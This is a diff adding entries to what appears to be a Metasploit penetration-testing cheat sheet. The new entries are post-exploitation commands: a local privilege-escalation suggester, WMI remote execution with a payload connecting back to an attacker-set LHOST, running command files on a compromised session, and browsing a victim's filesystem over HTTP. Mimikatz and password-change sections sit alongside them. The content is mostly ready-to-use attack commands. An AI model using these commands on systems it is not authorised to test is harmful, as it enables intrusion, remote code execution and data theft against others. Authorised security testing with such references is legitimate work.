@@ -286,6 +286,38 @@ use post/windows/manage/change_password
 run -o OLD_PASSWORD=<old_password>,NEW_PASSWORD=<new_password>,SESSION=<1>,SMBDomain=<domain>,SMBUser=<user>
 ```
 
+# Local exploit suggester
+```ruby
+use post/multi/recon/local_exploit_suggester
+run SESSION=<1>
+```
+
+# Execute commands via Windows Management Instrumentation (WMI)
+```ruby
+use exploit/windows/local/wmi
+# run -o LHOST=<payload_connect_to_ip>,SESSION=<1> <127.0.0.1>
+# run -o LHOST=<payload_connect_to_ip>,SESSION=<1> <remote_ip_of_session>
+# run -o LHOST=<payload_connect_to_ip>,SESSION=<1>,SMBDomain=<domain>,SMBUser=<user>,SMBPass=<password> <remote_ip_from_session>
+```
+
+# Run metasploit commands from provided files
+```ruby
+resource <path_to_resource_file_1> <path_to_resource_file_2>
+```
+
+# Run shell/system commands from a provided file
+```ruby
+use post/multi/gather/multi_command
+run SESSION=<1>,RESOURCE=<path_to_file>
+```
+
+# Browse the session filesystem in a web browser
+```ruby
+use post/multi/manage/fileshare
+run -o SESSION=<1>,URIPATH=<random>
+# open http://127.0.0.1:8080/<random>/C:
+````
+
 # Mimikatz
 ## Meterpreter
 ### Change password
